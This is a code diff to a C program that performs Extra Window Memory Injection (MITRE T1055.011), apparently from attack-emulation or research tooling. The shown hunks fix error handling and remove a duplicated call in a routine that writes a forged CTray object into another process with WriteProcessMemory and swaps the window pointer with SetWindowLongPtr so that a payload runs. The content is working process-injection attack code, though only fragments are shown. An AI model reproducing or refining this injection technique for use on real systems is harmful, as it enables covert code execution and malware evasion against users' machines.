@@ -65,7 +65,7 @@ LPVOID ewm(LPVOID payload, DWORD payloadSize){
     {
         printf("GetWindowLongPtr failed!\n");
         CloseHandle(hp);
-        return;
+        exit(-1);
     }
 
     // 5. Read address of the current CTray object
@@ -90,8 +90,7 @@ LPVOID ewm(LPVOID payload, DWORD payloadSize){
     WriteProcessMemory(hp, ds, &ct, sizeof(ct), &wr); 
 
     // 11. Set the new pointer to CTray object
-    SetWindowLongPtr(hw, 0, (ULONG_PTR)ds);
-    if (SetWindowLongPtr(hw, 0, (ULONG_PTR)ds) == 0) 
+    if (SetWindowLongPtr(hw, 0, (ULONG_PTR)ds) == 0)
     {
         printf("SetWindowLongPtr failed!\n");
         VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT);
@@ -149,7 +148,7 @@ int main(void) {
   #endif
   if (payloadSize == 0) { printf("invalid payload\n"); return 0; }
 
-  // Executes payload usin Extra Window Memory Injection (T1055.011)
+  // Executes payload using Extra Window Memory Injection (T1055.011)
   ewm(payload, payloadSize);
 
   return 0;
